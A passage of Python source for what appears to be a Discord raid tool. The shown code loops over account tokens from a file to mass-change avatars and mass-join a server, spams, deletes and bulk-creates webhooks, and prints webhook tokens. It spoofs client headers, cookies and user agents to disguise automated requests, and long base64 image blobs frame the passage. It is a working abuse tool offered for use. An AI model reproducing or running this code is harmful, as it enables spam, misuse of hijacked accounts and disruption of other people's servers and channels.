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"

        payload3 = {
            'avatar':image
        }

    url = 'https://discord.com/api/v9/users/@me'
  
    tokens = []
    token = []

    with open('tokens.txt','r') as f:
        for line in f:
            tokens.append(line)

        for element in tokens:
            token.append(element.strip())

        length = len(token)

    for x in range(length):
        header = {
            "authority": "discord.com",
            "method": "POST",
            "path": "/api/v9/users/@me",
            "scheme": "https",
            "accept": "*/*",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "en-US",
            "Authorization": f"{token[x]}",
            "content-length": "0",
            "cookie": f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US",
            "origin": "https://discord.com",
            'referer': 'https://discord.com/channels/@me',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": useragent(),
            "x-context-properties": "eyJsb2NhdGlvbiI6Ikludml0ZSBCdXR0b24gRW1iZWQiLCJsb2NhdGlvbl9ndWlsZF9pZCI6Ijg3OTc4MjM4MDAxMTk0NjAyNCIsImxvY2F0aW9uX2NoYW5uZWxfaWQiOiI4ODExMDg4MDc5NjE0MTk3OTYiLCJsb2NhdGlvbl9jaGFubmVsX3R5cGUiOjAsImxvY2F0aW9uX21lc3NhZ2VfaWQiOiI4ODExOTkzOTI5MTExNTkzNTcifQ==",
            "x-debug-options": "bugReporterEnabled",
            "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJjYW5hcnkiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC42MDAiLCJvc192ZXJzaW9uIjoiMTAuMC4yMjAwMCIsIm9zX2FyY2giOiJ4NjQiLCJzeXN0ZW1fbG9jYWxlIjoic2siLCJjbGllbnRfYnVpbGRfbnVtYmVyIjo5NTM1MywiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0="
        }

        if optionsforpfp == 1:
            r = requests.patch(url,headers=header,json=payload1)
            if r.status_code == 200:
                print(Fore.GREEN + f'Done! added pfp to {token[x]}')
            else:
                print(r)
        elif optionsforpfp == 2:
            r = requests.patch(url,headers=header,json=payload2)
            if r.status_code == 200:
                print(Fore.GREEN + f'Done! added pfp to {token[x]}')
            else:
                print(r)

        elif optionsforpfp == 3:
            r = requests.patch(url,headers=header,json=payload3)
            if r.status_code == 200:
                print(Fore.GREEN + f'Done! added pfp to {token[x]}')
            else:
                print(r)

        else:
            print("Error")

  global joiner
  def joiner():
      cls()
      ctypes.windll.kernel32.SetConsoleTitleW("Token Joiner")
      print(f'''
{Fore.MAGENTA}      _       _                 
     | | ___ (_)_ __   ___ _ __ 
  _  | |/ _ \| | '_ \ / _ \ '__|
{Fore.RED} | |_| | (_) | | | | |  __/ |   
  \___/ \___/|_|_| |_|\___|_|   
                                

      ''')
      tokens = []
      token = []

      with open('tokens.txt','r') as f:
        for line in f:
          tokens.append(line)

        for element in tokens:
          token.append(element.strip())

      length = len(token)

      invite = input("What is the invite of the server you want to join? (Only Code): ")
      invite.replace('https://discord.gg/','')
      invite.replace('discord.gg/','')

      url = f'https://discord.com/api/v9/invites/{invite}'

      for x in range(length):
          header = {
              "authority": "discord.com",
              "scheme": "https",
              "accept": "*/*",
              "accept-encoding": "gzip, deflate, br",
              "accept-language": "en-US",
              "Authorization": f'{token[x]}',
              "content-length": "0",
              "cookie": f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US",
              "origin": "https://discord.com",
              'referer': 'https://discord.com/channels/@me',
              "sec-fetch-dest": "empty",
              "sec-fetch-mode": "cors",
              "sec-fetch-site": "same-origin",
              "user-agent": useragent(),
              "x-context-properties": "eyJsb2NhdGlvbiI6Ikludml0ZSBCdXR0b24gRW1iZWQiLCJsb2NhdGlvbl9ndWlsZF9pZCI6Ijg3OTc4MjM4MDAxMTk0NjAyNCIsImxvY2F0aW9uX2NoYW5uZWxfaWQiOiI4ODExMDg4MDc5NjE0MTk3OTYiLCJsb2NhdGlvbl9jaGFubmVsX3R5cGUiOjAsImxvY2F0aW9uX21lc3NhZ2VfaWQiOiI4ODExOTkzOTI5MTExNTkzNTcifQ==",
              "x-debug-options": "bugReporterEnabled",
              "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJjYW5hcnkiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC42MDAiLCJvc192ZXJzaW9uIjoiMTAuMC4yMjAwMCIsIm9zX2FyY2giOiJ4NjQiLCJzeXN0ZW1fbG9jYWxlIjoic2siLCJjbGllbnRfYnVpbGRfbnVtYmVyIjo5NTM1MywiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0="
          }

          r = requests.post(url, headers=header)
          if r.status_code == 200:
              print(f'Joined With {token[x]}!')
          else:
              print("Error")

  def webhooks():
    global options2
    cls()
    ctypes.windll.kernel32.SetConsoleTitleW("Webhook Raiders")
    options2 = input(f'''
{Fore.MAGENTA} __        __   _     _                 _      ____       _     _               
 \ \      / /__| |__ | |__   ___   ___ | | __ |  _ \ __ _(_) __| | ___ _ __ ___ 
  \ \ /\ / / _ \ '_ \| '_ \ / _ \ / _ \| |/ / | |_) / _` | |/ _` |/ _ \ '__/ __|
{Fore.RED}   \ V  V /  __/ |_) | | | | (_) | (_) |   <  |  _ < (_| | | (_| |  __/ |  \__ |
    \_/\_/ \___|_.__/|_| |_|\___/ \___/|_|\_\ |_| \_\__,_|_|\__,_|\___|_|  |___/
                                                                              
    {Fore.BLUE}
    [01] CHECK WEBHOOK
    [02] WEBHOOK INFO
    [03] DELETE WEBHOOK
    [04] SPAM WEBHOOK
    [05] CREATE WEBHOOKS
    [06] CREATE + SPAM WEBHOOKS
    [07] EXIT
    
    [\>]''')


    if options2 in ['1','01']:
      cls()
      ctypes.windll.kernel32.SetConsoleTitleW("Webhook Checker")
      hookcheck = print(f'''
{Fore.MAGENTA} __        __   _     _                 _       ____ _               _             
 \ \      / /__| |__ | |__   ___   ___ | | __  / ___| |__   ___  ___| | _____ _ __ 
  \ \ /\ / / _ \ '_ \| '_ \ / _ \ / _ \| |/ / | |   | '_ \ / _ \/ __| |/ / _ \ '__|
{Fore.RED}   \ V  V /  __/ |_) | | | | (_) | (_) |   <  | |___| | | |  __/ (__|   <  __/ |   
    \_/\_/ \___|_.__/|_| |_|\___/ \___/|_|\_\  \____|_| |_|\___|\___|_|\_\___|_|                                                                                           
      
      ''')

      hookcheck = input(Fore.GREEN + 'What is your webhook link?: ')
      r = requests.get(hookcheck)
      if r.status_code == 200:
        print("Valid Webhook Link!")
      else:
        print("Webhook Link Not Valid!")

    elif options2 in ['2','02']:
      cls()
      ctypes.windll.kernel32.SetConsoleTitleW("Webhook Information")
      options3 = print(f'''
      {Fore.MAGENTA} __        __   _     _                 _      ___        __       
       \ \      / /__| |__ | |__   ___   ___ | | __ |_ _|_ __  / _| ___  
        \ \ /\ / / _ \ '_ \| '_ \ / _ \ / _ \| |/ /  | || '_ \| |_ / _ |
      {Fore.RED}   \ V  V /  __/ |_) | | | | (_) | (_) |   <   | || | | |  _| (_) |
          \_/\_/ \___|_.__/|_| |_|\___/ \___/|_|\_\ |___|_| |_|_|  \___/                                                                
            ''')

      options3 = input("What is your webhook link?: ")
      print(Fore.RESET)
      r = requests.get(options3)
      print(f'Webhook Name: {Fore.GREEN}{r.json()["name"]}')
      print(f'{Fore.RESET}Webhook ID: {Fore.GREEN}{r.json()["id"]}')
      print(f'{Fore.RESET}Guild ID of Webhook: {Fore.GREEN}{r.json()["guild_id"]}')
      print(f'{Fore.RESET}Channel ID of Webhook: {Fore.GREEN}{r.json()["channel_id"]}')
      if r.json()['avatar'] == 'null':
          print(f'{Fore.RESET}Avatar: {Fore.GREEN} None')
      else:
          avatar = f'https://cdn.discordapp.com/avatars/{r.json()["id"]}/{r.json()["avatar"]}'
          print(f'{Fore.RESET}Avatar: {Fore.GREEN}{avatar}')
      print(f'{Fore.RESET}Token of Webhook :{Fore.GREEN}{r.json()["token"]}')


    elif options2 in ['3','03']: 
      cls()
      ctypes.windll.kernel32.SetConsoleTitleW("Webhook Deleter")
      print(f'''
  {Fore.MAGENTA} __        __   _     _                 _      ____       _      _            
   \ \      / /__| |__ | |__   ___   ___ | | __ |  _ \  ___| | ___| |_ ___ _ __ 
    \ \ /\ / / _ \ '_ \| '_ \ / _ \ / _ \| |/ / | | | |/ _ \ |/ _ \ __/ _ \ '__|
  {Fore.RED}   \ V  V /  __/ |_) | | | | (_) | (_) |   <  | |_| |  __/ |  __/ ||  __/ |   
      \_/\_/ \___|_.__/|_| |_|\___/ \___/|_|\_\ |____/ \___|_|\___|\__\___|_|   
                                                                              
      ''')  
      web = input("Webhook Link: ")
      try:
        requests.delete(web)
        print("Webhook successfully deleted")
      except:
        print("Error deleting webhook")

    elif options2 in ['4','04']:
      cls()
      ctypes.windll.kernel32.SetConsoleTitleW("Webhook Spammer")
      print(f"""
  {Fore.MAGENTA} __        __   _     _                 _      ____                                            
   \ \      / /__| |__ | |__   ___   ___ | | __ / ___| _ __   __ _ _ __ ___  _ __ ___   ___ _ __ 
    \ \ /\ / / _ \ '_ \| '_ \ / _ \ / _ \| |/ / \___ \| '_ \ / _` | '_ ` _ \| '_ ` _ \ / _ \ '__|
  {Fore.RED}   \ V  V /  __/ |_) | | | | (_) | (_) |   <   ___) | |_) | (_| | | | | | | | | | | |  __/ |   
      \_/\_/ \___|_.__/|_| |_|\___/ \___/|_|\_\ |____/| .__/ \__,_|_| |_| |_|_| |_| |_|\___|_|   
                                                      |_|                                            
      """)

      webhook = input("Webhook Link: ")
      message = input("Message: ")
      delay = float(input("Delay: "))

      while True:
        try:
          time.sleep(delay)
          data = requests.post(webhook, json={'content': message})

          if data.status_code == 204:
            print(f"{message} sent!")
        except:
          print("Error, or wrong webhook: {}".format(webhook))
          time.sleep(delay)

    elif options2 in ['5','05']:  
        cls()
        ctypes.windll.kernel32.SetConsoleTitleW("Webhook Creator")
        print(f'''
{Fore.MAGENTA} __        __   _     _                 _       ____                _             
 \ \      / /__| |__ | |__   ___   ___ | | __  / ___|_ __ ___  __ _| |_ ___  _ __ 
  \ \ /\ / / _ \ '_ \| '_ \ / _ \ / _ \| |/ / | |   | '__/ _ \/ _` | __/ _ \| '__|
{Fore.RED}   \ V  V /  __/ |_) | | | | (_) | (_) |   <  | |___| | |  __/ (_| | || (_) | |   
    \_/\_/ \___|_.__/|_| |_|\___/ \___/|_|\_\  \____|_|  \___|\__,_|\__\___/|_|   
                                                                                        
        
        ''')

        chanid = input("What is the channel id you want to make the webhooks in?: ")
        tukan4 = input("What is the token to use?: ")

        print("Starting Now...")

        def spammer():

            url = f'https://discord.com/api/v9/channels/{chanid}/webhooks'

            global randstr

            def randstr(lenn):
                alpha = "abcdefghijklmnopqrstuvwxyz0123456789"
                text = ''
                for i in range(0, lenn):
                    text += alpha[random.randint(0, len(alpha) - 1)]
                return text


            header = {
                "authority": "discord.com",
                "method": "POST",
                "path": f"/api/v9/channels/{chanid}/webhooks",
                "scheme": "https",
                "accept": "*/*",
                "accept-encoding": "gzip, deflate, br",
                "accept-language": "en-US",
                "Authorization": f'{tukan4}',
                "content-length": "0",
                "cookie": f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US",
                "origin": "https://discord.com",
                'referer': 'https://discord.com/channels/@me',
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
                "user-agent": useragent(),
                "x-context-properties": "eyJsb2NhdGlvbiI6Ikludml0ZSBCdXR0b24gRW1iZWQiLCJsb2NhdGlvbl9ndWlsZF9pZCI6Ijg3OTc4MjM4MDAxMTk0NjAyNCIsImxvY2F0aW9uX2NoYW5uZWxfaWQiOiI4ODExMDg4MDc5NjE0MTk3OTYiLCJsb2NhdGlvbl9jaGFubmVsX3R5cGUiOjAsImxvY2F0aW9uX21lc3NhZ2VfaWQiOiI4ODExOTkzOTI5MTExNTkzNTcifQ==",
                "x-debug-options": "bugReporterEnabled",
                "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJjYW5hcnkiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC42MDAiLCJvc192ZXJzaW9uIjoiMTAuMC4yMjAwMCIsIm9zX2FyY2giOiJ4NjQiLCJzeXN0ZW1fbG9jYWxlIjoic2siLCJjbGllbnRfYnVpbGRfbnVtYmVyIjo5NTM1MywiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbH0="
            }




            url2 = "data:image/jpeg;base64,/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEAAoHCBUVFRgVEhUYGBgYEhIYGBIYEhgYGBISGBgZGRgVGBgcIS4lHB4rHxgYJjgmKy8xNTU1GiU7QDs0Py40NTEBDAwMEA8QGhISGjQhJCE0NDE0NDQ0NDQ0NDQxNDQ0NDQxMTQxMTQ0NDQ0NDQxNDQ0NDQ0NDE1MTE0NDQxNDQ0Mf/AABEIAKYBLwMBIgACEQEDEQH/xAAcAAACAgMBAQAAAAAAAAAAAAADBAIFAAEGBwj/xAA5EAACAgEDAgMHAgQGAQUAAAABAgARAwQhMRJBBVFhBhMiMnGBkaHBQrHw8RRSYoLR4SMHM1Nyov/EABkBAQEBAQEBAAAAAAAAAAAAAAABAgMEBf/EACERAQEBAQACAgIDAQAAAAAAAAABAhEDIRIxQVEEIjIT/9oADAMBAAIRAxEAPwCi07S20plZp0lvo8c7vnLbSiXmlErdJilvp0irFhhjmMRbCsdxrOddsi44ZZBVhFEzXWRKZU3UyGmqkSskZq4KiViOsTvHiZR+0vi2DBjYZc64mdGCMaLA1QZVPNGWMWdByLK/X67FhF5XRAeOpqJ+g5M8jy+2WrshdS7E3/l4NjYVKPUq7PbMSWAPVe7H6/j8zXWf+PfuvUtX7a6cGsaZMnFFU6RZ7fFv96MqF9u7fpfCAvmuQlh6UVonjynH6dRj3sBqNPyF87Pb/uJnI7P0oOp2bo6gQfeFqUKK5sn73Ha1PDn9PX9NqkyoMmM9SnvVEHuCDwZphBezXhRwaZEa+ojrcNyrsB1LyRsdtua+8ZdN50l9PFqSavECBFs2QCNukTyYrM0yrs+Y8RbIlxrU4qaAdbhVc+HkwKbGP5FFStZ6MNQx7wAwibmJqLNxvEIBnTykEQxjHjuGGOEKhDCBIwEkWWVC5WDdIyyyBSFBGKTRIQLMYQCYAOoRnNR4i2NSY1gx+cjNVmlW50Ggxym0Q4l7o3mHRdaROJb6dIjoekiWuICSt5g+NY0ixZDGsbTFdoOokxIq0lMusbmTU3DTUypkT8T1ww42cgnpUmhV0BufoO8Mk/ajxM6bTZMqi2VT02LAY7AkdwJ89a7UvqXd8jl3Kkl2NkAD9APIbATtPaL2hfOvTks9b7kUFVAekgAbk9JPPF+s5dMA0odmYM560xqosc/Ob77CvvflNScJ7VyaVygxuQqDIHIPTYdh0XY+LjtxCvqFA+EgEXTE89IsX6neLajrNuWPVyNzYr15J43jXsZ7Pf4/MyM5RETrdgLYgsAFW9gd+T5StWc91U5c7ZCVQX1dI6QLJaxQXvZIAAHnU9H9jPY4YVGfUAHIRjfGAzKcPLENVW24B5HI876jwv2Y0umo4sQ6wbGRvicHpKkgn5bBOwobyxcyyPL5PN2cyXyQDJGWimoy9M3HmobLvFMrUYTJqe8RfMWO80gOoYMb4lXn1QU7S0z1RlE+MsdhCxHJkLnaDGmMstJo+5jGTCBxC9VuLBGlSpJMRuEYASo0H8oUERXI9QQcmA6cogmcRYXJKsgNcGzzGEzGl/vKqSGFC+UnjxiEoXvxCNJtGUMCqf2h1xyJVPpckutNknNabNLjTZpHR1egy1LnBlnH6bUGXOk1XmZmwl46JMkYTJKVNUIzi1QmLHWaXiPJh5Upqo1izXM2Os0sAZkGjyXVI6dTnm/t94p1ZVwcBSD1fFRsXVed8Gtv5eiNkAFkgAcknYCeJ+0mvLZc+Surqd0QrZodTC1B3r+K/WXKWqHU5LcIAKFKrngt1k2a7Amq3qzzI6hlZ3dlLOSQGbhOOB2Jo/rEkbZUU7sxvz2IC2316iSN9hC6nV79BPG3UOG7H7cy1uAZ2sn+XaLLqGxktjd0JHSWRmVipolSVINWBt6TeRyTt3iuUHvBVvofa3V4T8Gd2Xf4MjHIDtt81kb77ESxz/8AqFqiKAxC6HUuNgw+WzuxH+b9Iv4N7FanOA5ARDwzggkeYXkzodP/AOnaD/3MxPoqV+pMf2cta8fffHPv7e6gBOgLa4wjM56/eMCD7wrQpjR8x8RnV+xvv82n95qGJ63YpfPu9h9aLBqvtULh9iNEtdSO1Hhsho+hrtOlRVACqAAAAABQAGwAHYTWZe9rh5N4s5mEcmkFbRDUaUiXTiBbEDzOnXnUP+FvmFXRDsJaZdKDuJtKHaUV3+BI9IF8Mt9S+2wlNrHIgK5mA7xdsw7wecFoAptvCoZMwuYmS5pdNZjC4wIVPGv9pK5pSAIu2TeAfqmw2+0CsIsBhYZIBIzjNQg+MRpBF8YjWIDvCOFwtLTT5qlHhcxzFkMjov8ABqqlhg1c5zE8sNO8yOiw6omP4s85/A9R7Fmg6vseeNYtXUoEzRhM8nGpp0SeISf+OlEmWEVyQSOAN27KPMntJxqaprx7xMJp8jFeu06Ql11F/hA/Jnj3izLSort0Inx+SsGPVS1vvt33/M7T2j8S6Cjo6OoIAxt8qsOq8nqRtQb19a8412Qu1FrtizNe7VxZ78k/iZrvjN/LXXQL1RJIQXuB/XfzJMr8zb/1t6Qz5L3PlSj0l/7F+z66l2fNviQ0VuveZCLCWNwBsT9h3iOmtTM7WvZP2Vy6n/yOzJh/zAkHJRoqnpzvx9Z32g9ntLpzaYlLA37x7d7+rXX2lxjCqAqgKqgBVAoKo2AA7CQy47m5Hj35LpE6kGRd5BsdcQXT5yuImZwBvIY84kGw3uYPo8pYlMu+0H12JqidpL3ZqURoec2EEr8nUGomPYsVjmADUuB3lFrnJ4j+sUqd4hkYtsBKQkiNCnBcYTTt5QqIRyIXoGPD0jeB1BH8MY1WSV7NZ5gDbqmIkJUKid4VD3dcwqY4VU8xCqkqIDGO0PjTzksaQ+Ne5kS1iLGcf5g1EKPSB5tjMZQxTGY0hmHQ5haPYHldjjmETQtsWWN4mlTiEsdM0nA+rQ3vVTd3RQKss6qBzySaHFSSoEHVkBAIdWYFbxsKAUi+oOSQQK7G+0odZrsSKp92rumP3fvGRSekHq+WqHxFjY8/WYunXHj77rsXwBEJLWCop1rZz2QN82xFE0Nu91K/xOshpsgAAUDGQQGZL+I9IHSTbE/tORyeOPk+Zye4F/k7f1xJal26C7vSnYclshHIX/TvuxmbXeYkKe0WdUBRHXI9nqcUVCkkBVsWSANz67TleugT6EfmWOs1F3Qq/X/qVDj9JHSTiBeuZ6j4Dj9xgRBsa6n9cjbt/wAfYTznwXo9+nvBa9dtfoCRfpdT0r3k6YjzfyNfUWCZmO9xlNQ3ErcLwvWRvN8eVYlwOTAu/VxEvfk7frCI/kY4nTXQZNVqCRjCO4G5gELAcyK5AxoGU+t1gO1xnQ6pFXneOB1sC3ZkMmfpHwiV2u8To12gk8SQxwR1KPkMY0vh9bmMaXOnJjObWoo2IgL5go52qVWozXsIXWa1W2lecguUkZlwkxUYTHvfzasPKFKrhjKYoZBcIFhOl1SGRO0IqQirUCCJCKskFhOmBBVhVUzapJqkMvK8cYRoBYdBMO5rE8ewtEMSxxDU0ixwmWL5ExY+vIVLFSyYyxBtWHxuK+Tnbvt2lZg1gwochHU5IVENbX1HrIPNdBr1H0lNqMrO1vbE31E7kgW3J+/6TGtfh28Xj77rovEdaznCm6glsjAbWxvmuSRXfzlDm3RxZvrO32q/wD+ZZu1shNgnEBdfKQQCB9Af0lTkSute92P6/rmYtenM9AeH6frdAzULv/6gWWP4B/SOeJa73j9C0FUV6Ig4WVvhWU9TksB04+mzwvWwHV9gDE82tABXHsO718THuZKo2syWfh4HrKw5LJr+8hlz2KH9hIonnxEgmjUb8gZ6L7P6j3mmxueQvST5lD03+k84ykfKOe+/6T0v2ew1pcSd+ksf9zFv5ETePtw/kc+MGOeu8Fm8Q8oy2jBmJ4USdxtOrxtaPKzRscxjDpVQSv1OdVJ3hFkdSBKbxLxnssR1ni2xAlO+ouFmTeTWkwmm15B3lYN4VMZhriy1Or6osmUzXuofHpr4hE01DdjGVZmG9yK6bpjSJtCFwkKmmviFx4qj2LFCdJLpTDppj2lliwSboBArRiqFXHCkwqGAJMfaSCRiSau0gXCTOiF6ZsLAiBDADtIhZILA8lRYwiwISEQmTjoYTaFx2xA8yB/3F1fzj2iALfZa+pdV/kTFvISdvDnigRH6EB+FKJvdshA2JrYD08h6yjzswU3zdX382lprXByvvfxZLFkbX5/cyo8Sc9H45Nm/P7/tOL3ZnD+l1nVsfmViQfMev2k9Uwbcd+1Sj0j0QfyfKWTttvttcNt+D6VGTIjUWORSfVVFgfkmC1ePfpVAO1KBx9v+IrlUlt7HTvf+r6/pF8+ZjsXY/wC7avUHiEPJpMd1koDe+rb/AIqJa4IGrGortRJ6hxam6PB2ijsEWz34HFwenzk2r7hiKrlG7Ff02gY+MEFlr1q/1B3Bnd6DxJHQe7bZVUFeCu1bj9+JyS6VlUturoSjrV7H5Sw8j5/USKh8dZcYIX/MFJRvMHsPUS5tjnvM3Pt6RpNWvncsMGtBO9TjfCNamRbBph8yXup/cSzbKZ2nt4dZubyn/FNdZpTt6Sg1DGNpR5En7m+BKkUb4WM0mn85eHSGR/wnnC9V64h5RrDgj2DSjvHkRRwIS1XY9JcsNPoq3jOHGIwEuGekcmICax4ye0sV0w7mFRAIUriwV2jmHTQmwmzqKkBCgUbnmJajIDsJvLkLcmRGPueO8CCqP67zZAmgsmogbVZMf0ZsN6D6zdQIgSXMwit/5SK5xddJgFVZIMOJp7rbaL9bL2v17wPL0xHzkhjfzmY40hh0KjG0Ij9I3NXkxj7dVn+Ua6LgPEcfSiX/ABOx+y9O/wCsmvpvxzuolqAepieWY9XOwvc7cf8AcrNcT019/X8fiW+clnyqDVOw4G536STt/OVGvFDf8Tg9sKaZ9gPqb9B/X6R5M3SCxok/Kv8AlUcSu0WMs3SO/wCg5MuNUMPSFXnbqPnXr9ZqRNXhVD1WSb/aotqR0jqrtZ+v1/EutB4ddMD0r+SfpD+LaRfcuQLPSNzuekEE15TXxv25Xyz5ccS7FjZ+w7AeUsvZ/D1